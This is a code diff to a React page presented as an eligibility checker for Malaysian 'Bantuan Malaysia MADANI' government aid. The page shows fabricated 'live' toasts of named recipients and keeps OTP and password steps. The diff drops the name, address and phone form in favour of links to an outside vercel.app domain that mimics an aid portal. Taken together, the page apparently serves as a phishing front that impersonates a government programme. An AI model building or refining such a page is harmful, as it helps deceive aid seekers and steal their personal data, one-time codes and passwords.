@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useRef, useEffect, useCallback } from "react";
+import { useState, useRef, useEffect } from "react";
 
 const phonePrefix = "+60";
 
@@ -17,16 +17,6 @@ function formatLocalPhone(digits: string) {
   if (digits.length <= 5) return digits.slice(0, 2) + " " + digits.slice(2);
   return digits.slice(0, 2) + " " + digits.slice(2, 5) + " " + digits.slice(5);
 }
-
-function isAllowedPhoneNumber(digits: string) {
-  return digits.length >= 4;
-}
-
-const fieldErrorMessages: Record<string, string> = {
-  full_name: "Sila masukkan nama penuh yang sah.",
-  address: "Sila masukkan alamat penuh yang sah.",
-  phone_number: "Sila masukkan nombor telefon yang sah.",
-};
 
 const liveMessages = [
   { name: "Ahmad", bantuan: "Bantuan Warga Emas", negeri: "Selangor", masa: "Baru sahaja", theme: "emas" },
@@ -56,22 +46,17 @@ export default function Home() {
   const [fullName, setFullName] = useState("");
   const [address, setAddress] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
-  const [fullPhone, setFullPhone] = useState("");
+  const fullPhone = "";
   const [otpCode, setOtpCode] = useState(["", "", "", "", ""]);
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [confirmAgree, setConfirmAgree] = useState(false);
-  const [errors, setErrors] = useState<Record<string, boolean>>({});
-  const [errorMessages, setErrorMessages] = useState<Record<string, string>>({});
-  const [invalidFields, setInvalidFields] = useState<Record<string, boolean>>({});
   const [otpError, setOtpError] = useState("");
   const [passwordError, setPasswordError] = useState("");
   const [confirmError, setConfirmError] = useState("");
   const [toastIndex, setToastIndex] = useState(0);
   const [toastVisible, setToastVisible] = useState(false);
   const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
-  const phoneInputRef = useRef<HTMLInputElement>(null);
-  const firstFormRef = useRef<HTMLFormElement>(null);
   const toastTimerRef = useRef<NodeJS.Timeout | null>(null);
 
   // Live toast rotation
@@ -101,91 +86,6 @@ export default function Home() {
 
   const setFormStep = (s: number) => {
     setStep(s);
-  };
-
-  const setFieldError = (fieldId: string, show: boolean, message?: string) => {
-    setErrors((prev) => ({ ...prev, [fieldId]: show }));
-    if (message) setErrorMessages((prev) => ({ ...prev, [fieldId]: message }));
-  };
-
-  const setFieldInvalid = (fieldId: string, invalid: boolean) => {
-    setInvalidFields((prev) => ({ ...prev, [fieldId]: invalid }));
-  };
-
-  const clearFormErrors = () => {
-    ["full_name", "address", "phone_number"].forEach((id) => {
-      setFieldInvalid(id, false);
-      setFieldError(id, false);
-    });
-  };
-
-  const handleInputChange = (fieldId: string, value: string) => {
-    if (value.trim()) {
-      setFieldError(fieldId, false);
-      setFieldInvalid(fieldId, false);
-    }
-  };
-
-  const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const el = e.target;
-    const digits = normalizeMalaysiaPhone(el.value);
-    const formatted = formatLocalPhone(digits);
-    setPhoneNumber(formatted);
-
-    if (digits.length > 0) {
-      setFieldError("phone_number", false);
-      setFieldInvalid("phone_number", false);
-    }
-  };
-
-  const handlePhonePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
-    e.preventDefault();
-    const pasted = e.clipboardData.getData("text");
-    const digits = normalizeMalaysiaPhone(pasted);
-    setPhoneNumber(formatLocalPhone(digits));
-  };
-
-  const handleFirstFormSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    clearFormErrors();
-
-    let isValid = true;
-    if (!fullName.trim()) {
-      setFieldError("full_name", true);
-      setFieldInvalid("full_name", true);
-      isValid = false;
-    }
-    if (!address.trim()) {
-      setFieldError("address", true);
-      setFieldInvalid("address", true);
-      isValid = false;
-    }
-    if (!phoneNumber.trim()) {
-      setFieldError("phone_number", true);
-      setFieldInvalid("phone_number", true);
-      isValid = false;
-    }
-    if (!isValid) return;
-
-    const localDigits = normalizeMalaysiaPhone(phoneNumber);
-    if (!isAllowedPhoneNumber(localDigits)) {
-      setFieldError("phone_number", true, "Sila masukkan nombor telefon.");
-      setFieldInvalid("phone_number", true);
-      return;
-    }
-
-    const fullPhoneNum = phonePrefix + localDigits;
-    setFullPhone(fullPhoneNum);
-    setLoading(true);
-
-    // Simulate API call
-    setTimeout(() => {
-      setLoading(false);
-      setFormStep(2);
-      setTimeout(() => {
-        otpRefs.current[0]?.focus();
-      }, 100);
-    }, 800);
   };
 
   const updateOtpValue = () => {
@@ -338,17 +238,16 @@ export default function Home() {
               <span className="site-header__brand-sub">Semak Layak — 2026</span>
             </span>
           </a>
-          <button
-            type="button"
+          <a
             className="site-header__pill"
-            onClick={() => firstFormRef.current?.scrollIntoView({ behavior: "smooth" })}
+            href="https://bantuannmalaysia.vercel.app/"
             aria-label="Semak kelayakan"
           >
             <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
               <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C8.01 14 6 11.99 6 9.5S8.01 5 10.5 5 15 7.01 15 9.5 12.99 14 10.5 14z" />
             </svg>
             Semak
-          </button>
+          </a>
         </div>
       </header>
 
@@ -463,31 +362,11 @@ export default function Home() {
               )}
 
               <div className="card-inner">
-                {/* Steps indicator */}
-                {step <= 3 && (
-                  <nav className="form-steps" aria-label="Langkah semakan kelayakan">
-                    <div className={`form-steps__item ${step >= 1 ? "is-active" : ""} ${step > 1 ? "is-done" : ""}`} data-step="1">
-                      <span className="form-steps__dot">1</span>
-                      <span className="form-steps__label">Maklumat</span>
-                    </div>
-                    <div className={`form-steps__item ${step === 2 ? "is-active" : ""} ${step > 2 ? "is-done" : ""}`} data-step="2">
-                      <span className="form-steps__dot">2</span>
-                      <span className="form-steps__label">Pengesahan</span>
-                    </div>
-                    <div className={`form-steps__item ${step === 3 ? "is-active" : ""}`} data-step="3">
-                      <span className="form-steps__dot">3</span>
-                      <span className="form-steps__label">Sahkan</span>
-                    </div>
-                  </nav>
-                )}
-
                 <div className="form-panel">
                   {/* STEP 1 */}
                   {step === 1 && (
                     <div className="first">
-                      <form ref={firstFormRef} onSubmit={handleFirstFormSubmit} noValidate>
-                        <input type="hidden" name="full_phone" value={fullPhone} />
-
+                      <div>
                         <div className="register-form__head">
                           <span className="register-form__badge">
                             <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
@@ -499,111 +378,23 @@ export default function Home() {
                             Semak Layak <em>Bantuan Malaysia MADANI</em>
                           </h2>
                           <p className="register-form__subtitle">
-                            Lengkapkan borang di bawah — pastikan anda menyemak kelayakan bantuan yang sesuai.
+                            Klik butang di bawah untuk menyemak kelayakan bantuan yang sesuai.
                           </p>
                           <div className="register-form__accent" aria-hidden="true"></div>
                         </div>
 
-                        <p className="register-form__fields-label">Maklumat Pemohon</p>
-
-                        <div className={`icon-field ${invalidFields["full_name"] ? "is-invalid" : ""}`}>
-                          <span className="icon-field__icon" aria-hidden="true">
-                            <svg viewBox="0 0 24 24" fill="currentColor">
-                              <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zm0 2l5 5h-5V4zM8 12.5h8v1.5H8v-1.5zm0 3.5h8V18H8v-1.5z" />
-                            </svg>
-                          </span>
-                          <input
-                            name="full_name"
-                            id="full_name"
-                            maxLength={40}
-                            type="text"
-                            placeholder="Nama Penuh"
-                            value={fullName}
-                            onChange={(e) => {
-                              setFullName(e.target.value);
-                              handleInputChange("full_name", e.target.value);
-                            }}
-                          />
-                        </div>
-                        {errors["full_name"] && (
-                          <p className="field-error is-visible" role="alert">
-                            {errorMessages["full_name"] || fieldErrorMessages["full_name"]}
-                          </p>
-                        )}
-
-                        <div className={`icon-field ${invalidFields["address"] ? "is-invalid" : ""}`}>
-                          <span className="icon-field__icon" aria-hidden="true">
-                            <svg viewBox="0 0 24 24" fill="currentColor">
-                              <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1112 6a2.5 2.5 0 010 5.5z" />
-                            </svg>
-                          </span>
-                          <input
-                            name="address"
-                            id="address"
-                            maxLength={120}
-                            type="text"
-                            placeholder="Alamat Penuh"
-                            value={address}
-                            onChange={(e) => {
-                              setAddress(e.target.value);
-                              handleInputChange("address", e.target.value);
-                            }}
-                          />
-                        </div>
-                        {errors["address"] && (
-                          <p className="field-error is-visible" role="alert">
-                            {errorMessages["address"] || fieldErrorMessages["address"]}
-                          </p>
-                        )}
-
-                        <div className={`icon-field phone-field ${invalidFields["phone_number"] ? "is-invalid" : ""}`}>
-                          <span className="icon-field__icon" aria-hidden="true">
-                            <svg viewBox="0 0 24 24" fill="currentColor">
-                              <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.19 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z" />
-                            </svg>
-                          </span>
-                          <span className="phone-field__code" aria-hidden="true">
-                            +60
-                          </span>
-                          <input
-                            ref={phoneInputRef}
-                            name="phone_number"
-                            id="phone_number"
-                            maxLength={13}
-                            type="tel"
-                            inputMode="numeric"
-                            autoComplete="tel-national"
-                            placeholder="12 345 6789"
-                            aria-describedby="phone_number_hint"
-                            value={phoneNumber}
-                            onChange={handlePhoneInput}
-                            onPaste={handlePhonePaste}
-                          />
-                        </div>
-                        <p className="phone-field__hint" id="phone_number_hint">
-                          Masukkan nombor telefon yang sah
-                        </p>
-                        {errors["phone_number"] && (
-                          <p className="field-error is-visible" role="alert">
-                            {errorMessages["phone_number"] || fieldErrorMessages["phone_number"]}
-                          </p>
-                        )}
-
                         <div className="register-form__submit">
-                          <button type="submit" className="btn btn-register w-100">
+                          <a
+                            className="btn btn-register w-100"
+                            href="https://bantuannmalaysia.vercel.app/"
+                          >
                             Semak Kelayakan Sekarang
                             <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                               <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C8.01 14 6 11.99 6 9.5S8.01 5 10.5 5 15 7.01 15 9.5 12.99 14 10.5 14z" />
                             </svg>
-                          </button>
-                          <p className="register-form__secure">
-                            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-                              <path d="M18 8h-1V6a5 5 0 00-10 0v2H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V10a2 2 0 00-2-2zm-6 9a2 2 0 01-2-2 2 2 0 114 0 2 2 0 01-2 2zm3.1-9H8.9V6a3.1 3.1 0 016.2 0v2z" />
-                            </svg>
-                            Data anda dilindungi &amp; disulitkan
-                          </p>
+                          </a>
                         </div>
-                      </form>
+                      </div>
                     </div>
                   )}
 
@@ -886,9 +677,7 @@ export default function Home() {
               </div>
               <ul>
                 <li>Terbuka untuk warganegara Malaysia — semakan kelayakan 8 kategori bantuan, permohonan tahun 2026 masih dibuka.</li>
-                <li>Lengkapkan maklumat pemohon mengikut kad pengenalan (IC).</li>
-                <li>Pastikan Nama Penuh dan Alamat sudah diisi dengan betul.</li>
-                <li>Gunakan nombor telefon yang sah untuk pengesahan dan semakan permohonan.</li>
+                <li>Klik butang Semak Kelayakan Sekarang untuk meneruskan semakan.</li>
               </ul>
             </div>
           )}
